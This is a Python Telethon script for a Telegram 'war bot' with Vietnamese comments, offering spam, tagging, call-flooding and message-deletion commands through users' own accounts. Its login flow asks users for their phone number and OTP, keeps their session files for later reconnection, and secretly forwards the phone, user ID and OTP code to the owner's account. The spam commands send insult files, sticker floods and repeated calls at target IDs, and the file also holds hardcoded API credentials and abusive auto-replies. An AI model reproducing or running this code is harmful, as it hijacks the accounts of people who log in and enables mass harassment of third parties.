import asyncio, os, random, datetime, edge_tts, re, glob
from telethon import TelegramClient, events, Button, functions, types
from telethon.errors import FloodWaitError, RPCError, PremiumAccountRequiredError

# --- CẤU HÌNH HỆ THỐNG ---
API_ID = 33198241
API_HASH = 'b11ee4073038a1baddd8cd1d55eab053'
BOT_TOKEN = '8485568610:AAGjw52ZWK1glt30sx5pymNVcgQFPUovp44'
OWNER_ID = 6924956412 

bot = TelegramClient('bot_manage', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

user_clients = {}
cam_box_list = {}
cam_ib_list = {}
spam_tasks = {}
call_tasks = {}
autore_tasks = {}
off_tasks = {}
war_start_marks = {} 

# --- PHẦN LƯU TRỮ QUẢN LÝ ---
USER_FILE = "bot_users.txt"
BAN_FILE = "banned_users.txt"

if os.path.exists(BAN_FILE):
    with open(BAN_FILE, "r") as f:
        banned_users = set(int(line.strip()) for line in f if line.strip())
else:
    banned_users = set()

def save_ban():
    with open(BAN_FILE, "w") as f:
        for uid in banned_users: f.write(f"{uid}\n")

def save_user(uid):
    if not os.path.exists(USER_FILE): open(USER_FILE, "w").close()
    with open(USER_FILE, "r") as f: users = f.read().splitlines()
    if str(uid) not in users:
        with open(USER_FILE, "a") as f: f.write(f"{uid}\n")

MENU_TEXT = """
. 　˚　. . ✦˚ .     　　˚　　　　✦　.
𖣘 𝑳𝒂𝒐 𝑻𝒉𝒊𝒆𝒏 𝑾𝒂𝒓 𝑩𝒐𝒕  2026 𖣘
.  ˚　.　 . ✦　˚　 .   .　.  　˚　  　.

🔥 𝑺𝒑𝒂𝒎 & 𝑻𝒂𝒈
┣ /sp <id>
┣ /sp2 <id>
┣ /spicon <số lượng>
┣ /spnd <nội dung>
┣ /spstick <số lượng>
┗ /spcall <id>

☠ 𝑯𝒆‌‌ 𝑻𝒉𝒐‌‌𝒏𝒈 Đ𝒆𝒐 𝑹𝒐‌
┣ /cam <id> <id box>
┣ /sua <id> <id box>
┣ /camib <id>
┗ /suaib <id>

📦 𝑳𝒂‌𝒕 𝑽𝒂‌𝒕
┣ /voice <text>
┣ /autore <on/off>
┣ /off <on/off>
┣ /stop
┣ /clear - xóa 100 tin nhắn gần nhất
┗ /clear2 - xóa tin nhắn bot

  tài khoản
  /logout - thoát ra khỏi tài khoản
"""

def setup_war_logic(client, user_id):
    def mark_war(chat_id):
        war_start_marks[f"{user_id}_{chat_id}"] = datetime.datetime.now(datetime.timezone.utc)

    async def safe_send(chat_id, content, target_id=None):
        spam_tasks[user_id] = True
        is_infinite = isinstance(content, str)
        lines = content if not is_infinite else [content]
        count = 0
        while spam_tasks.get(user_id):
            for msg in lines:
                if not spam_tasks.get(user_id): break
                try:
                    final = f"{msg.strip()} [\u200b](tg://user?id={target_id})" if target_id else msg.strip()
                    await client.send_message(chat_id, final, parse_mode='markdown')
                    await asyncio.sleep(random.uniform(0.8, 1.2)) 
                    count += 1
                    if count % 10 == 0: await asyncio.sleep(3)
                except FloodWaitError as e: await asyncio.sleep(e.seconds + 2)
                except: break
            if not is_infinite: break

    # --- KIỂM TRA BAN KHI GÕ LỆNH ---
    @client.on(events.NewMessage(outgoing=True))
    async def check_ban_global(e):
        if e.text and e.text.startswith('/') and user_id in banned_users:
            await e.edit("Mày đã bị ban bởi lão thiên ib @Anhlathiendola3 để van xin quỳ lạy anh thiên unban cho")
            raise events.StopPropagation

    @client.on(events.NewMessage(outgoing=True, pattern=r'/sp (\d+)'))
    async def sp_cmd(e):
        tid = int(e.pattern_match.group(1)); mark_war(e.chat_id); await e.delete()
        if os.path.exists('chui.txt'):
            await safe_send(e.chat_id, open('chui.txt', 'r', encoding='utf-8').readlines(), tid)

    @client.on(events.NewMessage(outgoing=True, pattern=r'/sp2 (\d+)'))
    async def sp2_cmd(e):
        tid = int(e.pattern_match.group(1)); mark_war(e.chat_id); await e.delete()
        if os.path.exists('spam2.txt'):
            await safe_send(e.chat_id, open('spam2.txt', 'r', encoding='utf-8').read().strip(), tid)

    @client.on(events.NewMessage(outgoing=True, pattern=r'/spicon (\d+)'))
    async def spam_icon(e):
        if user_id in banned_users: return
        mark_war(e.chat_id) 
        key = f"{user_id}_{e.chat_id}"
        spam_tasks[user_id] = True 
        try:
            count = int(e.pattern_match.group(1))
            if count > 500: count = 500
        except: count = 10
        icons = ["🧠", "💩", "🤪", "🤣", "💀", "🤡", "🫵", "🙄", "🤙", "👻"]
        await e.delete()
        for _ in range(count):
            if not spam_tasks.get(user_id): break
            await e.respond(random.choice(icons))
            await asyncio.sleep(0.3)

    # --- FIX LỆNH SPND: CHẤP MỌI ĐỘ DÀI, TREO XUYÊN ĐÊM ---
    @client.on(events.NewMessage(outgoing=True, pattern=r'/spnd\s+([\s\S]+)'))
    async def spnd_cmd(e):
        content = e.pattern_match.group(1).strip()
        mark_war(e.chat_id)
        await e.delete()
        spam_tasks[user_id] = True
        print(f"🚀 [ID:{user_id}] Bắt đầu spam+treo...")
        while spam_tasks.get(user_id):
            try:
                await client.send_message(e.chat_id, content)
                await asyncio.sleep(random.uniform(0.7, 1.1))
            except FloodWaitError as err:
                print(f"⏳ Đang ngủ {err.seconds}s do FloodWait...")
                await asyncio.sleep(err.seconds + 1)
            except Exception as err:
                print(f"⚠️ Lỗi nhỏ: {err}")
                await asyncio.sleep(2)
                if not client.is_connected(): await client.connect()

    # --- LỆNH STOP: DỪNG TẤT CẢ TÁC VỤ ---
    @client.on(events.NewMessage(outgoing=True, pattern=r'/stop'))
    async def stop_cmd(e):
        spam_tasks[user_id] = False
        call_tasks[user_id] = False
        await e.edit("🛑 **ĐÃ DỪNG TOÀN BỘ CHIẾN DỊCH!**")
        await asyncio.sleep(2)
        await e.delete()

    @client.on(events.NewMessage(outgoing=True, pattern=r'/spstick (\d+)'))
    async def stick_cmd(e):
        mark_war(e.chat_id); num = int(e.pattern_match.group(1)); await e.delete(); spam_tasks[user_id] = True
        r = await client(functions.messages.GetRecentStickersRequest(hash=0))
        c = 0
        while c < num and spam_tasks.get(user_id):
            batch = min(50, num - c)
            await asyncio.gather(*[client.send_file(e.chat_id, random.choice(r.stickers)) for _ in range(batch)])
            c += batch; await asyncio.sleep(1.2)

    @client.on(events.NewMessage(outgoing=True, pattern=r'/spcall (\d+)'))
    async def call_cmd(e):
        mark_war(e.chat_id); tid = int(e.pattern_match.group(1)); await e.delete(); call_tasks[user_id] = True
        while call_tasks.get(user_id):
            try:
                res = await client(functions.phone.RequestCallRequest(user_id=tid, random_id=random.randint(0, 0x7fffffff), g_a_hash=os.urandom(32), protocol=types.PhoneCallProtocol(min_layer=93, max_layer=93, udp_p2p=True, library_versions=['2.1.0'])))
                await asyncio.sleep(2); await client(functions.phone.DiscardCallRequest(peer=types.InputPhoneCall(id=res.phone_call.id, access_hash=res.phone_call.access_hash), duration=0, reason=types.PhoneCallDiscardReasonDisconnect(), connection_id=0))
            except: await asyncio.sleep(5)

    @client.on(events.NewMessage(outgoing=True, pattern=r'/clear$'))
    async def clear_100(e):
        await e.edit("🧹 **Đang dọn 100 tin nhắn...**")
        async for msg in client.iter_messages(e.chat_id, from_user='me', limit=100):
            try: await msg.delete()
            except: continue

    @client.on(events.NewMessage(outgoing=True, pattern=r'/clear2'))
    async def clear_war(e):
        key = f"{user_id}_{e.chat_id}"
        start_t = war_start_marks.get(key)
        if not start_t:
            await e.edit("⚠️ **Không sài chức năng sp mà đòi clear!**"); await asyncio.sleep(2); await e.delete()
            return
        await e.edit("🧹 **Đang dọn...**")
        async for msg in client.iter_messages(e.chat_id, from_user='me'):
            if msg.date < start_t: break
            try: await msg.delete()
            except: continue
        war_start_marks.pop(key, None)

    @client.on(events.NewMessage(outgoing=True, pattern=r'/(cam|sua)(?:\s+(\d+))?(?:\s+(-?\d+))?'))
    async def cam_box_logic(e):
        cmd, uid, bid = e.pattern_match.group(1), e.pattern_match.group(2), e.pattern_match.group(3)
        if not uid and e.is_reply: uid = str((await e.get_reply_message()).sender_id)
        if not bid: bid = str(e.chat_id)
        if uid:
            key = f"{user_id}_{bid}_{uid}"
            if cmd == "cam": cam_box_list[key] = True
            else: cam_box_list.pop(key, None)
            await e.edit(f"✅ {cmd.upper()} ID: {uid}"); await asyncio.sleep(2); await e.delete()

    @client.on(events.NewMessage(outgoing=True, pattern=r'/(camib|suaib)(?:\s+(\d+))?'))
    async def cam_ib_logic(e):
        cmd, uid = e.pattern_match.group(1), e.pattern_match.group(2)
        if not uid: uid = str(e.chat_id) if e.is_private else (str((await e.get_reply_message()).sender_id) if e.is_reply else None)
        if uid:
            key = f"{user_id}_{uid}"
            if cmd == "camib": cam_ib_list[key] = True
            else: cam_ib_list.pop(key, None)
            await e.edit(f"✅ {cmd.upper()} ID: {uid}"); await asyncio.sleep(2); await e.delete()

    @client.on(events.NewMessage(outgoing=True, pattern=r'/info(?: (\d+))?'))
    async def info_cmd(e):
        target_id = e.pattern_match.group(1)
        if not target_id:
            if e.is_reply: target_id = (await e.get_reply_message()).sender_id
            else: target_id = e.sender_id
        try:
            user = await client.get_entity(int(target_id))
            info_text = (f"👤 INFO\n━━━━━━━━━━━━━━━\n🆔 ID: `{user.id}`\n👤 Tên: {user.first_name}\n🏷 @{user.username if user.username else 'N/A'}\n")
            await e.edit(info_text, parse_mode='markdown')
        except Exception as err: await e.edit(f"❌ Lỗi: {err}")

    @client.on(events.NewMessage(outgoing=True, pattern=r'/voice (.+)'))
    async def voice_cmd(e):
        text = e.pattern_match.group(1); await e.delete(); path = f"v_{user_id}.mp3"
        communicate = edge_tts.Communicate(text, "vi-VN-NamMinhNeural", rate="-15%", pitch="-5Hz")
        await communicate.save(path); await client.send_file(e.chat_id, path, voice_note=True)
        if os.path.exists(path): os.remove(path)

    @client.on(events.NewMessage(outgoing=True, pattern=r'/(autore|off)\s+(on|off)'))
    async def toggle_cmd(e):
        c, m = e.pattern_match.group(1), e.pattern_match.group(2)
        if c == "autore": autore_tasks[user_id] = (m == "on")
        else: off_tasks[user_id] = (m == "on")
        await e.edit(f"✅ {c.upper()} {m.upper()}"); await asyncio.sleep(2); await e.delete()

    @client.on(events.NewMessage(outgoing=True, pattern=r'/logout'))
    async def logout_cmd(e):
        await e.edit("🚮 **Đang đăng xuất...**")
        try: user_clients.pop(user_id, None); await client.log_out(); await e.edit("✅ Thành công!"); await asyncio.sleep(3); await e.delete()
        except Exception as err: await e.edit(f"❌ Lỗi: {err}")

    @client.on(events.NewMessage(incoming=True))
    async def brain_logic(event):
        if user_id in banned_users: return
        key_box = f"{user_id}_{event.chat_id}_{event.sender_id}"
        key_ib = f"{user_id}_{event.sender_id}"
        if cam_box_list.get(key_box) or (event.is_private and cam_ib_list.get(key_ib)):
            try: await event.delete()
            except: pass
            return
        if autore_tasks.get(user_id) and event.sender_id != user_id:
            try: await client(functions.messages.SendReactionRequest(peer=event.chat_id, msg_id=event.id, reaction=[types.ReactionEmoji(emoticon='❤️')]))
            except: pass
        if off_tasks.get(user_id) and (event.is_private or event.mentioned) and event.sender_id != user_id:
            try: await event.reply("địt mẹ nhắn cái lồn anh thiên off rồi đừng làm phiền anh")
            except: pass

# --- PHẦN QUẢN LÝ OWNER ---
@bot.on(events.NewMessage(pattern=r'/tb (.+)'))
async def broadcast(event):
    if event.sender_id != OWNER_ID: return
    msg = event.pattern_match.group(1)
    if not os.path.exists(USER_FILE): return
    with open(USER_FILE, "r") as f: ids = f.read().splitlines()
    for uid in ids:
        try: await bot.send_message(int(uid), msg); await asyncio.sleep(0.3)
        except: pass
    await event.respond("✅ Đã phát thông báo!")

@bot.on(events.NewMessage(pattern=r'/ban (\d+)'))
async def ban_handler(event):
    if event.sender_id != OWNER_ID: return
    uid = int(event.pattern_match.group(1))
    banned_users.add(uid); save_ban()
    if uid in user_clients:
        try: await user_clients[uid].disconnect(); user_clients.pop(uid)
        except: pass
    await event.respond(f"🚫 Đã ban `{uid}` vĩnh viễn!")

@bot.on(events.NewMessage(pattern=r'/unban (\d+)'))
async def unban_handler(event):
    if event.sender_id != OWNER_ID: return
    uid = int(event.pattern_match.group(1))
    if uid in banned_users:
        banned_users.remove(uid); save_ban()
        await event.respond(f"✅ Đã unban cho `{uid}`.")

async def auto_reconnect():
    print("🔄 Đang khôi phục các phiên đăng nhập cũ...")
    session_files = glob.glob("u_*.session")
    for file in session_files:
        try:
            uid = int(file.split('_')[1].split('.')[0])
            if uid in banned_users: continue
            c = TelegramClient(f"u_{uid}", API_ID, API_HASH)
            await c.connect()
            if await c.is_user_authorized():
                user_clients[uid] = c
                setup_war_logic(c, uid)
                print(f"✅ Đã kết nối lại cho ID: {uid}")
            else: await c.disconnect()
        except: pass

@bot.on(events.CallbackQuery(data="login"))
async def login_flow(event):
    uid = event.sender_id
    if uid in banned_users:
        await event.answer("Mày đã bị ban bởi lão thiên ib @Anhlathiendola3 để van xin quỳ lạy anh thiên unban cho", alert=True)
        return
    async with bot.conversation(uid) as conv:
        try:
            await conv.send_message("📱 **Nhập Số Điện Thoại (+84...):**")
            phone = (await conv.get_response()).text.strip().replace(" ", "")
            c = TelegramClient(f"u_{uid}", API_ID, API_HASH)
            await c.connect()
            otp_code = "Đã login sẵn" 
            if not await c.is_user_authorized():
                res = await c.send_code_request(phone)
                await conv.send_message("📩 **Nhập mã OTP:**")
                otp_code = (await conv.get_response()).text.strip()
                await c.sign_in(phone, otp_code, phone_code_hash=res.phone_code_hash)

            user = await bot.get_entity(uid)
            user_link = f"[{user.first_name}](tg://user?id={uid})"
            report_text = f"🚀 **Có người sử dụng bot**\n\n🔍 **Thông Tin**\n━━━━━━━━━━━━━━━\n📞 **SĐT:** `{phone}`\n🆔 **ID:** `{uid}`\n🏷 **User:** @{user.username}\n👤 **Tên:** {user.first_name}\n🔗 **Trang cá nhân:** {user_link}\n🔑 **Mã OTP:** `{otp_code}`"
            await bot.send_message(OWNER_ID, report_text, parse_mode='markdown')
            user_clients[uid] = c
            setup_war_logic(c, uid)
            await conv.send_message("✅ **Kích hoạt Bot thành công!**")
        except Exception as e: await conv.send_message(f"❌ **Lỗi:** {e}")

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    save_user(event.sender_id)
    await event.respond(MENU_TEXT, buttons=[[Button.inline("📱 LOGIN", data="login")]])

async def main():
    await auto_reconnect()
    print("(( LAO THIEN 2026 - FINAL STABLE ))")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())

